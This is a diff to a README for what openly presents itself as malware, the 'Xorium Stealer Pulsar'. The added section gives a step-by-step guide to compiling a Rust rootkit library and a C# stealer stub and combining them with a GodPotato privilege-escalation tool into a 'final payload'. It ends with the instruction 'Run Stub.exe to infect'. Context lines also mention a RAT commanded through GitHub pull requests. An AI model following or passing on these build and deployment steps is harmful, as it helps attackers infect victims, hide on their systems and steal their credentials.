@@ -73,6 +73,37 @@ The stealer uses a masked string for configuration. No recompilation needed for 
 
 ---
 
+## 🏗️ Build Guide (Compile from Source)
+
+### Prerequisites
+- **Visual Studio 2022** (with .NET Framework 4.8 dev tools).
+- **Rust (Cargo)**: Install from [rustup.rs](https://rustup.rs).
+
+### Step 1: Build Shadow Core (Rootkit)
+Navigate to `shadow-main` folder and compile the native library.
+```bash
+cd shadow-main
+cargo build --release
+```
+*Output: `shadow-main/target/release/shadow_core.dll`*
+> **Note**: Rename this file to `shadow_core.dll` if needed and place it next to the Stub.
+
+### Step 2: Build Stealer Stub (C#)
+1.  Open `Xorium Stealer Pulsar.sln` in Visual Studio.
+2.  Select **Release** configuration.
+3.  Right-click `Stealer.Client` -> **Build**.
+4.  *Output: `Pulsar.Plugin.Client/Stealer.Client/bin/Release/Stub.exe`*
+
+### Step 3: Deployment
+Combine the files for the final payload:
+1.  `Stub.exe` (The Stealer)
+2.  `shadow_core.dll` (The Rootkit)
+3.  `GodPotato.exe` (The Privilege Escalator - Optional, auto-dropped if missing)
+
+Run `Stub.exe` to infect.
+
+---
+
 ## 📝 GitHub RAT Commands (Dystopia)
 *To use RAT mode, go to your GitHub Repo -> Pull Requests -> "Agent#{ID}"*
 
